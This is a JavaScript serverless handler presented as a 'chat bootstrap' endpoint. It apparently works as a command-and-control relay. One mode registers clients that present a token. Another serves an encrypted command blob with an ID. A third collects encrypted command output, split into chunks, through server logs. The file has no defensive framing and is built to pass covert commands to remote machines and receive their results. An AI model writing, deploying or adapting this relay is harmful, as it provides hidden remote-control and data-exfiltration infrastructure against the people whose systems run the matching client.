import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '53';
const CONTROL_PAYLOAD = 'U2FsdGVkX1+Qm7U6ic5Axvnrxjemb/koPa5kAb9jfBoTEx1b6f+BBHKEGzxNGp5KSrPlvlbM9LfoNVtHC15rpFX9di9/GBQNmh184qXLiwERaQWyNbfLgW/SfzT2bxywaxhTQD6lfkwmYA5rxIQxthnUoSDIrOx6bnuwd6W0/HfIuA8/+3AJsFkdUA6hHISzojr0zIShqc6ZAmXPnetNDv8wkyWPqTui+7ZL6qSNX6GL1lje3FrUOM+sYsOlSkhGKRem9XmjygPcyYH0G2vJN4Y9VZNer0FRUTekUWph0FCkXPnbHNF4yZEEKa6GDxWy1mHD92O8Qj/BS4TWGyTtqwUmMhMk4JkE9MUqnXiCD6YGzB2goHO2tqUd+/lboTnPGRAXtYUy+E67YeQUpJopEIRAWVm3GAQ26bOAkgZjpYRq4fL/7TCWoaNpb2/w6oddq0bh8yNhK9oQBcsZ3SvaYdj72G5wl5oUsapgv6tRlhHGUM3aQEbq7YOL6Vrf2DcGFsFEi7GpwOxaXcnlCfi1d4m+vokS3/2t5OVLtV8Iu5aPLU4gU3FrOG2drEIlxe+zgfGnWgmjc9ml/s7Jgbk0JhDEQx2FUXM4FkpgCirHi50eF5G5Tuu5R3HS37L6AIdDDCrSJ/HVnE8TzZYmmoA6MNIcWv0+MrMH5+oT43s9j6XKLto9WjQO8HG70clDUaAIRVSK8kuNxiwfsddX45T0BGPvGmRPnZPhpx6UkAzSyVn5Jw3L9tIhYRATjW7ctoMfHsNSQFPipwWK7X7XH45pNUlZkSIOlcNU9kOH+ZRE7JvlMffIY/tk8FfiN5Ajl2w9oWVWMyJk+hQEIBN3wkBsyOmpMiZA6g9caDaEF5R9SFCSJCh0eFn2Bzdnk8f/GYPyKS4TYrGduTFQCyP+7iNOmrsvVCewc77lX3/fcDlF6HFKGbqAgRaCtFGUyLDqQg+L4FOqo2Id8MApQXrxDoAkb3qKBPOkwfyGPpkklt+84IoLHI9CA0twSySgodXKRlWgHFQW3KDmWca79BYYzKoJ35A9tnuBMypRHEJ807WBsCvFYf5WiWVdcFyDsqnuR8Steg2ruRrGFFh/plWySVnaT1HCOtGFUF1JVsUzFVhzCvgmRjQ6/SX9Csd1ej2GXPzhIjMRu9xjEMo+gb28SvYsjQ==';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
